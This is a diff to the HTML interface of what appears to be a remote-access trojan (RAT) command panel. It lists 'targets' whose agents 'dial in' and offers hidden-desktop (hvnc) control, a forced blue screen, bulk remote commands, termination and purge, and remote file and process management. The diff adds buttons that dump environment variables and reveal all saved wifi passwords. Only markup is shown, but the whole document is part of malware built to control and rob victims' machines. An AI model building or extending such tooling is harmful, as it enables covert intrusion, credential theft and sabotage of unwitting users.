@@ -25,6 +25,9 @@
     <button class="tbtn" data-tool="sort" title="sort">
       <svg viewBox="0 0 24 24"><path d="M7 4v16"/><path d="M3 16l4 4 4-4"/><path d="M17 20V4"/><path d="M13 8l4-4 4 4"/></svg>
     </button>
+    <button class="tbtn" data-tool="groups" title="manage groups">
+      <svg viewBox="0 0 24 24"><path d="M4 7h7l2 2h7v10H4z"/><path d="M4 4h7l2 2"/></svg>
+    </button>
     <button class="tbtn" data-tool="select" title="select all">
       <svg viewBox="0 0 24 24"><path d="M4 12l5 5L20 6"/></svg>
     </button>
@@ -41,12 +44,27 @@
   </div>
 </header>
 
-<main id="grid" class="grid"></main>
+<div class="groupbar" id="groupBar"></div>
+
+<div class="bulkbar hidden" id="bulkBar">
+  <span class="bcount" id="bulkCount">0 selected</span>
+  <input id="bulkGrp" class="binput" list="bulkGrpList" placeholder="group…" autocomplete="off" spellcheck="false">
+  <datalist id="bulkGrpList"></datalist>
+  <button class="bbtn" data-bulk="assign">assign</button>
+  <button class="bbtn" data-bulk="ungroup">ungroup</button>
+  <button class="bbtn" data-bulk="pin">pin</button>
+  <button class="bbtn" data-bulk="unpin">unpin</button>
+  <button class="bbtn" data-bulk="cmd">run cmd</button>
+  <button class="bbtn danger" data-bulk="exit">terminate</button>
+  <button class="bbtn danger" data-bulk="purge">purge</button>
+  <button class="bbtn ghost" data-bulk="clear">clear</button>
+</div>
+
+<main id="board" class="board"></main>
 <div id="empty" class="empty hidden">
   <div class="esig">no targets</div>
   <p>waiting for an agent to dial in</p>
 </div>
-<div id="listview" class="listview hidden"></div>
 
 <!-- ===================== command modal ===================== -->
 <section id="modal" class="modal hidden">
@@ -90,12 +108,18 @@
         <!-- files -->
         <section class="pane" id="pane-files">
           <div class="fbar">
-            <button id="fUp" class="ibtn" title="up">↑</button>
+            <button id="fUp" class="ibtn" title="up one level">↑</button>
             <button id="fHome" class="ibtn" title="drives">⌂</button>
-            <input id="fPath" class="fpath" spellcheck="false">
+            <input id="fPath" class="fpath" spellcheck="false" placeholder="path — Enter to open">
             <button id="fGo" class="ibtn" title="open">↵</button>
             <button id="fRefresh" class="ibtn" title="refresh">⟳</button>
+            <span class="fspacer"></span>
+            <button id="fUpload" class="ibtn" title="upload file">⇧</button>
+            <button id="fMkdir" class="ibtn" title="new folder">+</button>
+            <button id="fRename" class="ibtn" title="rename selected">✎</button>
+            <button id="fDelete" class="ibtn danger" title="delete selected">✕</button>
           </div>
+          <div class="fhint" id="fHint">double-click a file to download · click to select</div>
           <div class="ftree" id="ftree"></div>
         </section>
 
@@ -264,6 +288,14 @@
               <h4>top processes <span class="hint" id="sysProcHint">click to kill</span></h4>
               <div id="sysProcs" class="proclist"></div>
             </div>
+            <div class="syscard wide">
+              <h4>all processes <span class="hint" id="procHint">—</span></h4>
+              <div class="procbar">
+                <input id="procSearch" class="winput" placeholder="filter by name, pid, path" autocomplete="off" spellcheck="false">
+                <button class="btn" id="procRefresh">refresh</button>
+              </div>
+              <div id="procList" class="proclist full"></div>
+            </div>
           </div>
           <div class="quick" id="sysQuick"></div>
           <pre id="sysOut" class="term small"></pre>
@@ -344,6 +376,44 @@
               <button class="btn danger" data-act="bsod">blue screen</button>
             </div>
             <div class="mbox">
+              <h4>environment</h4>
+              <input id="envFilter" class="winput" placeholder="filter (blank = all)">
+              <button class="btn" data-act="env-dump">dump variables</button>
+            </div>
+            <div class="mbox">
+              <h4>wallpaper</h4>
+              <input id="wallPath" class="winput" placeholder="C:\path\image.jpg or https://…">
+              <div class="row2">
+                <button class="btn accent" data-act="wall-set">set</button>
+                <button class="btn" data-act="wall-get">current</button>
+                <button class="btn" data-act="wall-clear">clear</button>
+              </div>
+              <label class="sel">style
+                <select id="wallStyle">
+                  <option value="10">fill</option>
+                  <option value="6" selected>fit</option>
+                  <option value="2">stretch</option>
+                  <option value="0">center</option>
+                  <option value="22">span</option>
+                </select>
+              </label>
+            </div>
+            <div class="mbox">
+              <h4>wifi</h4>
+              <div class="row2">
+                <button class="btn" data-act="wifi-profiles">profiles</button>
+                <button class="btn accent" data-act="wifi-passwords">all passwords</button>
+              </div>
+              <input id="wifiSsid" class="winput" placeholder="ssid (single)">
+              <button class="btn" data-act="wifi-password">show password</button>
+            </div>
+            <div class="mbox">
+              <h4>wake-on-lan</h4>
+              <input id="wolMac" class="winput" placeholder="aa:bb:cc:dd:ee:ff">
+              <input id="wolBcast" class="winput" placeholder="broadcast (blank = auto)">
+              <button class="btn accent" data-act="wol">send magic packet</button>
+            </div>
+            <div class="mbox">
               <h4>hidden desktop (hvnc)</h4>
               <div class="row2">
                 <button class="btn" data-act="hvnc-start">start</button>
@@ -362,6 +432,29 @@
           <div class="xferlist" id="xferList"></div>
         </section>
       </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===================== group manager ===================== -->
+<section id="groupModal" class="modal hidden">
+  <div class="sheet narrow">
+    <header class="sheet-head">
+      <div class="who">
+        <span class="mhost">groups</span>
+        <span class="mmeta">sections, colors and bulk targets</span>
+      </div>
+      <div class="sheet-tools">
+        <button id="gmClose" class="tbtn"><svg viewBox="0 0 24 24"><path d="M6 6l12 12"/><path d="M18 6L6 18"/></svg></button>
+      </div>
+    </header>
+    <div class="ce-body">
+      <div class="gnew">
+        <input id="gmName" placeholder="new group name" autocomplete="off" spellcheck="false">
+        <input id="gmColor" type="color" value="#6366f1" title="group color">
+        <button class="btn accent" id="gmAdd">create</button>
+      </div>
+      <div id="gmList" class="gmlist"></div>
     </div>
   </div>
 </section>
